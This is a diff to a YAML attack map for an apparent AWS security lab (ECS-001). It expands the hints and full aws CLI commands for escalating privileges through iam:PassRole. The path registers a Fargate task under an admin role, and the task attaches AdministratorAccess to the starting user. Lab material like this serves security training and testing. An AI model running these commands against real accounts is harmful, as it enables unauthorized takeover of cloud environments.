@@ -5,6 +5,8 @@ attackMap:
       type: principal
       subType: iam-user
       arn: "arn:aws:iam::{account_id}:user/pl-prod-ecs-001-to-admin-starting-user"
+      access:
+        type: assumed-breach-credentials
       description: >
         You have gained access to this principal's AWS IAM credentials. These could
         have been obtained through many real-world vectors: phishing a developer and
@@ -58,9 +60,10 @@ attackMap:
         Create a new ECS cluster to host the malicious Fargate service. This is a
         prerequisite step before registering a task definition and service.
       hints:
-        - "You can create ECS infrastructure and deploy container workloads."
-        - "Look for roles with administrative permissions that you can pass to ECS tasks."
-        - "Combine cluster creation, task definition registration, and service creation to run code as a privileged role."
+        - "Start by reviewing the policy attached to this principal -- you have permissions over ECS and the ability to pass a specific IAM role."
+        - "Use ec2:DescribeVpcs and ec2:DescribeSubnets to gather the network details you will need for Fargate's awsvpc network mode."
+        - "Create an ECS cluster as the first step -- it is the container for your future Fargate service."
+        - "Combine cluster creation, task definition registration, and service creation to execute code as a privileged role."
         - "Browse to https://pathfinding.cloud/paths/ecs-001 for technique details."
       commands:
         - description: "Create the ECS cluster"
@@ -74,9 +77,11 @@ attackMap:
         role. The iam:PassRole permission is consumed here to authorize assigning the
         admin role to the ECS task.
       hints:
-        - "Set taskRoleArn to the privileged target role when registering the task definition."
-        - "Use a container image that has the AWS CLI available (e.g., amazon/aws-cli)."
-        - "Use: aws ecs register-task-definition --task-role-arn <admin-role-arn> ..."
+        - "Use sts:GetCallerIdentity to retrieve your account ID so you can construct the full ARN of the target role."
+        - "Set both taskRoleArn and executionRoleArn to the privileged target role when registering the task definition."
+        - "Use a container image that already has the AWS CLI available -- the task needs to call IAM APIs."
+        - "The container's command should call iam:AttachUserPolicy to escalate your starting user's permissions."
+        - "Use aws ecs register-task-definition with the --task-role-arn flag pointing to the target role ARN."
       commands:
         - description: "Register task definition with the privileged target role"
           command: "aws ecs register-task-definition --family pl-ecs-001-attack-task --task-role-arn arn:aws:iam::{account_id}:role/pl-prod-ecs-001-to-admin-target-role --execution-role-arn arn:aws:iam::{account_id}:role/pl-prod-ecs-001-to-admin-target-role --network-mode awsvpc --requires-compatibilities FARGATE --cpu 256 --memory 512 --container-definitions '[{\"name\":\"attack\",\"image\":\"amazon/aws-cli\",\"command\":[\"iam\",\"attach-user-policy\",\"--user-name\",\"pl-prod-ecs-001-to-admin-starting-user\",\"--policy-arn\",\"arn:aws:iam::aws:policy/AdministratorAccess\"]}]'"
@@ -88,6 +93,13 @@ attackMap:
         Create an ECS Fargate service that launches the malicious task definition.
         The service starts a task that runs as the privileged target role and attaches
         AdministratorAccess to the starting user.
+      hints:
+        - "You need to deploy a Fargate service that actually runs the task definition you just registered."
+        - "Use ecs:DescribeServices to monitor when the service becomes ACTIVE and has running tasks."
+        - "Use ecs:ListTasks and ecs:DescribeTasks to watch the task progress toward STOPPED status."
+        - "Once the task stops, allow 15 seconds for IAM policy propagation before verifying."
+        - "Verify escalation by calling an admin-only API (like iam:ListUsers) with your starting user credentials."
+        - "Browse to https://pathfinding.cloud/paths/ecs-001 for technique details."
       commands:
         - description: "Create the ECS service to run the malicious task"
           command: "aws ecs create-service --cluster pl-ecs-001-attack-cluster --service-name pl-ecs-001-attack-service --task-definition pl-ecs-001-attack-task --desired-count 1 --launch-type FARGATE --network-configuration 'awsvpcConfiguration={subnets=[<subnet-id>],assignPublicIp=ENABLED}'"
